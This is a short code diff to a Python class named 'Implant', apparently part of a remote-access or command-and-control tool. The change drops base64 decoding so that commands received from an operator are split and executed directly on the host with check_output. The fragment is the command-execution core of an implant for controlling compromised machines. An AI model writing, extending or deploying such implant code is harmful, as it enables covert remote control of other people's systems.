@@ -19,7 +19,7 @@ class Implant(Host):
 
     def instruction(self, shellpack):
         try:
-            cmd = base64.b64decode(shellpack['data'].decode()).decode()
+            cmd = shellpack['data'].decode()
             cmd = cmd.split(" ")
             output = check_output(cmd, stderr=STDOUT, timeout=3)
             # output = base64.b64encode(output)
